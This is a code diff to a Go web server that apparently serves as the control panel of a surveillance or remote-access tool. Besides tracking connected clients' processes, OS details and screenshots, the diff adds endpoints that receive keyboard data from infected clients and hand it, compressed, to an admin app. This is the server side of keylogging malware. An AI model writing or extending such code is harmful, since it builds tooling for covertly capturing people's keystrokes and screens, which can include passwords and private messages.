@@ -6,6 +6,7 @@ import (
 	"strconv"
 	"sync"
 	"x_server/types"
+
 	"github.com/gin-gonic/gin"
 	"gorm.io/gorm"
 )
@@ -16,6 +17,8 @@ type ProcessesContainer struct
 	mu sync.Mutex
 	ProcessesMap map[string]*[]types.Process
 }
+
+
 
 func (q * ProcessesContainer)SetProcesses(addr * string, processes * []types.Process) {
 	q.ProcessesMap[*addr] = processes
@@ -46,6 +49,7 @@ var ClientsProcesses = ProcessesContainer{ProcessesMap: make(map[string]*[]types
 
 var ClientsOSInfos	 	sync.Map
 var ClientsScreenShots 	sync.Map
+var ClientsKeyboardData	sync.Map
 
 
 var ClientInfoAboutCommands *int = nil
@@ -408,6 +412,50 @@ func FetchClientLastScreen(c * gin.Context) {
 		c.Writer.Write(*real_data)
 
 		ClientsScreenShots.Delete(addr)
+
+	}
+
+}
+
+// client sends keyboard data
+func AddClientKeyboardData(c * gin.Context) {
+
+	addr := GetClientIPAddress(c)
+
+	if (FindClientByIpAddrDB(DB, addr) == nil) {
+		c.String(http.StatusNotFound, "")
+		return
+	}
+
+	bytes, _ := io.ReadAll(c.Request.Body)
+
+	ClientsKeyboardData.Store(addr, &bytes)
+	c.String(http.StatusNoContent, "")
+}
+
+// admin app requesting data
+
+func GetClientKeyboardData(c * gin.Context) {
+
+	addr := c.Param("client_addr")
+
+	if (FindClientByIpAddrDB(DB, addr) == nil) {
+		c.String(http.StatusNotFound, "")
+		return
+	}
+
+	value, ok := ClientsKeyboardData.Load(addr)
+
+	if (ok) {
+		compressedBytes := value.(*[]byte)
+		c.Header("Content-Type", "text/plain; charset=utf8")
+		c.Header("Content-Encoding", "deflate")
+
+		c.Writer.Write(*compressedBytes)
+		ClientsKeyboardData.Delete(addr)
+
+	} else {
+		c.String(http.StatusNotFound, "")
 
 	}
 
